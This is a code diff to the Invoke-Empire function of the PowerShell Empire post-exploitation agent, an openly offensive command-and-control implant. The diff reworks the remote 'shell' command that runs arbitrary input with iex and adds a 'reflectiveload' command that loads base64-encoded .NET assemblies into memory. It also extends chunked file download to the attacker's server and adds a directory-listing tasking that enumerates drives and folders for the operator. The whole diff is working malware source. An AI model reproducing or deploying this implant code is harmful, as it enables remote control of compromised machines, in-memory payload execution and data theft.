@@ -274,8 +274,27 @@ function Invoke-Empire {
         if ($cmd.ToLower() -eq 'shell') {
             # if we have a straight 'shell' command, skip the aliases
             if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
-            else { $output = IEX "$cmdargs" }
+            else {
+                $OldConsoleOut = [Console]::Out
+                $StringWriter = New-Object IO.StringWriter
+                [Console]::SetOut($StringWriter)
+                $output = iex "$cmdargs" | out-string
+                #for somereason this was quoted again and it shouldn't need to be
+                #$output = iex $cmdargs
+                [Console]::SetOut($OldConsoleOut)
+
+                if ($output.length -eq 0){
+                    $output = $StringWriter.ToString()
+                    }
+            }
             $output += "`n`r..Command execution completed."
+        }
+        elseif ($cmd.ToLower() -eq 'reflectiveload'){
+            if ($cmdargs.length -eq '') { $output = 'no binary supplied' }
+            else{
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs))
+                $output = "`n`r Reflective Load Complete"
+            }
         }
         else {
             switch -regex ($cmd) {
@@ -441,8 +460,6 @@ function Invoke-Empire {
         param($JobName)
         if($Script:Jobs.ContainsKey($JobName)) {
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
         }
     }
 
@@ -455,8 +472,6 @@ function Invoke-Empire {
             $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
             # get results
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
             # unload the app domain runner
             $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
             $Script:Jobs.Remove($JobName)
@@ -851,9 +866,10 @@ function Invoke-Empire {
                         $Index = 0
                         do{
                             $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
+                            $filesize = (Get-Item $file).length
 
                             if($EncodedPart) {
-                                $data = "{0}|{1}|{2}" -f $Index, $file, $EncodedPart
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart
                                 (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
                                 $Index += 1
 
@@ -895,6 +911,36 @@ function Invoke-Empire {
                 catch {
                     Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                 }
+            }
+            # directory list
+            elseif($type -eq 43) {
+                $output = ""
+                $path = "/"
+                if ($data.length -gt 1) { # Use user supplied directory
+                    $path = $data
+                }
+                if ($path -eq "/") { # if the path is root, list drives as directories
+                    $array = @()
+                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
+                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false})
+                    }
+                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress
+                } elseif (-Not (Test-Path $path -PathType Container)) { # if path doesn't exist
+                    $output = "Directory " + $path + " not found."
+                } else {
+                # Normal conditions
+                    $array = @()
+                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) }
+                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) }
+                    $directory = Get-Item -force -Path $path # this way we always get the backslashes even if user supplied forward slashes
+                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress
+
+                    if ($directory -eq $null)
+                    {
+                        $output = "User does not have access to directory " + $path
+                    }
+                }
+                Encode-Packet -data $output -type $type -ResultID $ResultID
             }
 
             # return the currently running jobs
